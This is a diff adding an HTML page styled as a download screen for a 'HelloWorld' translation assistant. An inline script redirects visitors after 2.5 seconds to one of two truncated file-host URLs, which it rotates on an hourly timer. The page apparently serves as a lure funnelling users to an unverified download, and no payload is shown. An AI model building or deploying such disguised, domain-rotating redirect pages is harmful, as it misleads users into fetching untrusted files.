@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dynamic Rotations</title>
+    <style>
+        /* 页面居中样式 */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh; /* 视窗高度 */
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        /* 内容容器样式 */
+        .content {
+            max-width: 600px;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        h1 {
+            margin: 0 0 20px;
+            font-size: 1.5em; /* 字体小一些 */
+            color: #555; /* 颜色淡一些 */
+        }
+
+        img {
+            max-width: 50%; /* 缩小一倍 */
+            height: auto;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+
+        p {
+            font-size: 0.9em; /* 字体小一些 */
+            color: #777; /* 颜色淡一些 */
+        }
+    </style>
+    <script>
+        // URL列表
+        const urls = [
+            'https://files-accl.z',
+            'https://files-accl.'
+        ];
+
+        // 设置间隔时间和开始时间
+        const interval = 1 * 60 * 60 * 1000; // 24小时
+        const startTime = new Date('2024-12-09T16:20:00+08:00');
+        const startIndex = 0; // 从第一个URL开始
+
+        // 计算当前URL
+        const currentUrl = urls[(Math.floor((Date.now() - startTime) / interval) + startIndex) % urls.length];
+
+        // 2.5秒后跳转
+        setTimeout(() => {
+            window.location.href = currentUrl;
+        }, 2500);
+    </script>
+</head>
+<body>
+    <div class="content">
+        <h1>HelloWorld翻译助手</h1>
+        <img src="https://previewengine-accl.zohoexternal.com/image/WD/lljmvfb8500d0aca149c592ca5d3230591eed?version=1.0&width=2046&height=1536">
+        <p>下载中,请稍后...</p>
+    </div>
+</body>
+</html>
